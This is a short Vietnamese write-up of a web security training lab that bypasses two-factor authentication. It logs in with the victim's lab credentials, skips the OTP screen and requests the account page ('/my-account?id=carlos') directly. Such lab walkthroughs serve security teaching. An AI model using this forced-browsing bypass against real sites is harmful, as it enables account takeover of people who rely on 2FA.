# Authentication Lab 02: 2FA Simple Bypass

## Mục tiêu
Truy cập trang tài khoản của `carlos` mà không cần nhập mã 2FA.

## Đề bài
<img src="images/02_2fa-simple-bypass-2026-04-15-17-13-58.png" alt="Lab overview" width="760" />
<br><br>

## Bước 1: Đăng nhập tài khoản hợp lệ để hiểu luồng 2FA
Dùng credential được cấp:

```text
wiener:peter
```

Sau khi đăng nhập, hệ thống chuyển sang màn hình nhập mã 2FA và gửi OTP qua email client.

<img src="images/02_2fa-simple-bypass-2026-04-15-17-18-18.png" alt="Login wiener" width="760" />
<br><br>
<img src="images/02_2fa-simple-bypass-2026-04-15-17-18-58.png" alt="Màn hình nhập OTP" width="760" />
<br><br>
<img src="images/02_2fa-simple-bypass-2026-04-15-17-20-27.png" alt="Email chứa mã OTP" width="760" />
<br><br>

Nhập OTP để vào trang tài khoản và ghi nhận endpoint:

```http
GET /my-account?id=wiener
```

<img src="images/02_2fa-simple-bypass-2026-04-15-17-27-17.png" alt="My account của wiener" width="760" />
<br><br>

## Bước 2: Đăng nhập tài khoản nạn nhân và dừng ở bước 2FA
Đăng nhập bằng credential nạn nhân:

```text
carlos:montoya
```

Hệ thống cũng đưa đến màn hình nhập 2FA.

<img src="images/02_2fa-simple-bypass-2026-04-15-17-28-14.png" alt="Login carlos" width="760" />
<br><br>

## Bước 3: Bypass 2FA bằng truy cập thẳng trang tài khoản
Không nhập OTP, truy cập trực tiếp URL:

```http
GET /my-account?id=carlos
```

<img src="images/02_2fa-simple-bypass-2026-04-15-17-29-09.png" alt="Truy cập trực tiếp my-account carlos" width="760" />
<br><br>
<img src="images/02_2fa-simple-bypass-2026-04-15-17-30-19.png" alt="Lab solved" width="760" />
<br><br>

## Kết quả
Truy cập thành công tài khoản `carlos` mà không cần mã 2FA và hoàn thành lab.
